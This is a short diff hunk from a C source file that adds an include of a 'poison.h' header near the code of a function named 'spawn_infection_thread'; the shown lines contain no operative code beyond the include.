@@ -15,6 +15,8 @@
 #include "utility.h"
 #include "windows_wrapper.h"
 
+#include "poison.h"
+
 // static DWORD WINAPI infection_thread(LPVOID param);
 
 void spawn_infection_thread(void) {
